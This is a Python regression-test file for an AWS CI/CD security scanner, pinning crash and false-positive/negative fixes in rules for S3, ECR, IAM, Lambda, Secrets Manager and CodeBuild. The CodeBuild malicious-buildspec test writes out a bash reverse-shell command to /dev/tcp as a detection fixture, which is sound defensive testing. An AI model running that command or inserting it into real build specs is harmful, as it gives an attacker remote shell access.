"""Regression tests from the rule audit (FP/FN/crash fixes).

Each test pins a specific defect the audit found: a check that crashed
on valid-but-unusual input, or that produced a false positive / false
negative. Grouped here rather than scattered so the audit's coverage is
auditable in one place.
"""
from __future__ import annotations

from unittest.mock import MagicMock

import json

from pipeline_check.core.checks.aws.rules import cb008_inline_buildspec as cb008
from pipeline_check.core.checks.aws.rules import cb011_malicious_buildspec as cb011
from pipeline_check.core.checks.aws.rules import cd003_alarm_config as cd003
from pipeline_check.core.checks.aws.rules import cp005_production_approval as cp005
from pipeline_check.core.checks.aws.rules import ecr003_public_policy as ecr003
from pipeline_check.core.checks.aws.rules import iam005_external_trust as iam005
from pipeline_check.core.checks.aws.rules import lmb004_resource_policy_public as lmb004
from pipeline_check.core.checks.aws.rules import pbac002_shared_service_role as pbac002
from pipeline_check.core.checks.aws.rules import s3005_secure_transport as s3005
from pipeline_check.core.checks.aws.rules import sm001_rotation as sm001


def _catalog(**attrs):
    cat = MagicMock()
    for name, value in attrs.items():
        getattr(cat, name).return_value = value
    return cat


class TestS3005SecureTransport:
    def test_single_dict_statement_does_not_crash(self):
        # A legal S3 bucket policy may carry Statement as a single object,
        # not a list. Iterating it used to walk the dict's string keys.
        doc = {"Version": "2012-10-17", "Statement": {
            "Effect": "Deny", "Principal": "*", "Action": "s3:*",
            "Resource": "arn:aws:s3:::b/*",
            "Condition": {"Bool": {"aws:SecureTransport": "false"}}}}
        assert s3005._policy_denies_insecure_transport(doc) is True

    def test_list_form_condition_value_detected(self):
        # Bool condition value may be a single-element list ["false"].
        doc = {"Statement": [{"Effect": "Deny", "Condition": {
            "Bool": {"aws:SecureTransport": ["false"]}}}]}
        assert s3005._policy_denies_insecure_transport(doc) is True


class TestECR003PublicPolicy:
    def _check(self, policy):
        client = MagicMock()
        client.get_repository_policy.return_value = {"policyText": __import__("json").dumps(policy)}
        cat = _catalog(ecr_repositories=[{"repositoryName": "r"}])
        cat.client.return_value = client
        return ecr003.check(cat)[0]

    def test_bare_account_principal_does_not_crash_and_is_private(self):
        # A non-"*" string principal used to crash .get("AWS") on a str.
        f = self._check({"Statement": [{"Effect": "Allow",
            "Principal": "123456789012", "Action": "ecr:BatchGetImage"}]})
        assert f.passed is True

    def test_list_form_wildcard_is_public(self):
        # {"AWS": ["*"]} is a valid IAM representation of a public principal.
        f = self._check({"Statement": [{"Effect": "Allow",
            "Principal": {"AWS": ["*"]}, "Action": "x"}]})
        assert f.passed is False

    def test_org_scoped_wildcard_is_not_public(self):
        # The rule's own Safe example: wildcard principal narrowed by
        # aws:PrincipalOrgID is the org-sharing idiom, not public access.
        f = self._check({"Statement": [{"Effect": "Allow",
            "Principal": {"AWS": "*"}, "Action": "x",
            "Condition": {"StringEquals": {"aws:PrincipalOrgID": "o-abc"}}}]})
        assert f.passed is True


class TestPBAC002SharedServiceRole:
    def test_project_without_name_does_not_crash(self):
        cat = _catalog(codebuild_projects=[{"serviceRole": "arn:role/a"}])
        assert pbac002.check(cat)[0].passed is True


class TestCD003AlarmConfig:
    def test_alarm_without_name_does_not_crash(self):
        cat = _catalog(codedeploy_deployment_groups=[{
            "_ApplicationName": "a", "deploymentGroupName": "g",
            "alarmConfiguration": {"enabled": True, "alarms": [{"foo": "bar"}]}}])
        assert cd003.check(cat)[0].passed is True


class TestLMB004ResourcePolicyPublic:
    def test_non_dict_condition_does_not_crash(self):
        client = MagicMock()
        client.get_policy.return_value = {"Policy": (
            '{"Statement":[{"Effect":"Allow","Principal":"*",'
            '"Action":"lambda:InvokeFunction","Condition":"weird"}]}')}
        cat = _catalog(lambda_functions=[{"FunctionName": "f"}])
        cat.client.return_value = client
        res = lmb004.check(cat)
        assert res and res[0].passed is False


class TestCP005ProductionApproval:
    def test_substring_names_are_not_production(self):
        # "live"/"prod" were matched as substrings, so "Delivery",
        # "Deliver", and "Product" were misread as production stages.
        for name in ("Delivery", "Deliver", "Product"):
            assert cp005._name_matches_prod(name) is False

    def test_real_production_names_match(self):
        # Whole-word matching across camelCase / kebab / snake.
        for name in ("Production", "ProdDeploy", "deploy-prod", "go-live"):
            assert cp005._name_matches_prod(name) is True


class TestIAM005ExternalTrust:
    def _check(self, principal_arn, role_account="123456789012"):
        role = {
            "RoleName": "r", "Arn": f"arn:aws:iam::{role_account}:role/r",
            "AssumeRolePolicyDocument": {"Statement": [{"Effect": "Allow",
                "Principal": {"AWS": principal_arn},
                "Action": "sts:AssumeRole"}]}}
        return iam005.check(_catalog(cicd_roles=[role]))[0]

    def test_same_account_principal_not_flagged(self):
        # A same-account root principal is not a confused-deputy vector,
        # so a missing sts:ExternalId should not be flagged.
        assert self._check("arn:aws:iam::123456789012:root").passed is True

    def test_external_principal_still_flagged(self):
        assert self._check("arn:aws:iam::999999999999:root").passed is False


class TestSM001Rotation:
    def _check(self, ref_value, secrets):
        cat = _catalog(
            codebuild_projects=[{"name": "p", "environment": {
                "environmentVariables": [
                    {"type": "SECRETS_MANAGER", "value": ref_value}]}}],
            secrets=secrets)
        return sm001.check(cat)

    def test_arn_ref_matches_only_that_secret(self):
        # `split(":")[0]` reduced an ARN ref to the literal "arn", which
        # is a substring of every secret ARN, so every secret was flagged.
        arn = "arn:aws:secretsmanager:us-east-1:123:secret:prod/db-master-AbCdEf"
        res = self._check(arn, [
            {"Name": "prod/db-master", "ARN": arn, "RotationEnabled": False},
            {"Name": "other", "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:other-AAAAAA",
             "RotationEnabled": False}])
        assert len(res) == 1 and res[0].resource == "prod/db-master"

    def test_bare_name_does_not_match_sibling_prefix(self):
        # A bare-name ref "my-secret" used to match "my-secret-staging"
        # via the `ref in arn` substring branch.
        res = self._check("my-secret", [
            {"Name": "my-secret", "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:my-secret-XXXXXX",
             "RotationEnabled": True},
            {"Name": "my-secret-staging",
             "ARN": "arn:aws:secretsmanager:us-east-1:123:secret:my-secret-staging-YYYYYY",
             "RotationEnabled": False}])
        assert len(res) == 1 and res[0].resource == "my-secret" and res[0].passed is True


class TestCB008InlineBuildspec:
    def test_single_line_json_is_inline(self):
        # The shape the CodeBuild API/console emits for an inline JSON
        # buildspec; it has no newline and starts with '{'.
        spec = json.dumps({"phases": {"build": {"commands": ["x"]}}})
        assert cb008._is_inline(spec) is True

    def test_repo_path_is_not_inline(self):
        assert cb008._is_inline("ci/buildspec.yml") is False


class TestCB011MaliciousBuildspec:
    def test_single_line_json_reverse_shell_fires(self):
        spec = json.dumps({"phases": {"build": {"commands": [
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]}}})
        cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": spec}}])
        res = cb011.check(cat)
        assert res and res[0].passed is False

    def test_repo_path_buildspec_not_scanned(self):
        cat = _catalog(codebuild_projects=[{"name": "p", "source": {"buildspec": "ci/build.yml"}}])
        assert cb011.check(cat) == []
